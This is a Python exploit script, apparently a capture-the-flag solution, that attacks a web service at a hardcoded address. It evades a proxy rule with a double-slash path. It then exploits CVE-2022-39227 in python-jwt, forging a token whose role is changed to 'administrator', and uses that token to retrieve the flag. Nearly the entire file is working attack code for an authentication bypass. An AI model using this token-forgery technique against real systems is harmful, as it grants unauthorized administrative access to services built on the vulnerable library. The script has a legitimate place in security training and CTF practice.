#!/usr/bin/python3
import requests
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode

ip = "94.237.58.155"
port = 39169

url = f"http://{ip}:{port}//api/v1" # Bypass proxy rule

def get_ticket(s):
    req = s.get(url + "/get_ticket")
    s.headers.update({'Authorization': (req.json())['ticket: ']})
    return req.text

def chat(s, id):
    req = s.get(url + f"/chat/{id}")
    return req.text

def flag(s):
    """
    CVE-2022-39227
    """
    token = s.headers['Authorization']
    [header, payload, signature] = token.split(".")
    parsed_payload = loads(base64url_decode(payload))
    parsed_payload['role'] = 'administrator'
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
    new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
    s.headers.update({'Authorization' : new_payload})
    req = s.get(url + "/flag")
    return req.text

if __name__ == "__main__":
    s = requests.Session()
    get_ticket(s)
    print(flag(s))